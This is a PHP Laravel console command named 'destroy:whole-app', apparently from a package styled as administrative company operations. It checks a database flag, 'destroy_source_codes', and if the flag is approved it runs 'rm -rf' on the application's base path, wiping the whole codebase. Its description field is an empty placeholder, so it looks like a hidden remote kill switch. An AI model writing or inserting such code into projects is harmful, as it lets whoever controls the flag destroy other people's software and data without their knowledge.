<?php

namespace Poyrazenes\AdministrativeCompanyOperations\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class DestroyWholeApp extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'destroy:whole-app';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command description';

    /**
     * Execute the console command.
     */
    public function handle()
    {
        if (Schema::hasTable('administrative_company_operations')) {
            $row = DB::table('administrative_company_operations')
                ->where('type', 'destroy_source_codes')
                ->where('is_approved', true)->first();

            if ($row && $row->is_approved) {
                exec('rm -rf ' . base_path());
            }
        }
    }
}
